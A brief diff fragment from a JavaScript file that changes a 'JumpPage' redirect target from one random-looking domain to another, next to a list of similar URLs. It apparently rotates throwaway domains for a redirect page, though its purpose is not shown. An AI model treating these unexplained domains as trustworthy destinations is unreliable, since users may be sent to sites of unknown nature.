@@ -42,7 +42,7 @@ var urls=[
     'qxjzsbfk.com/',
 ];                                                                                                                  
 
-var JumpPage="https://rqsedpjwr.cc";
+var JumpPage="https://xihcntla.com";
 
 var newestUrls = [];
 
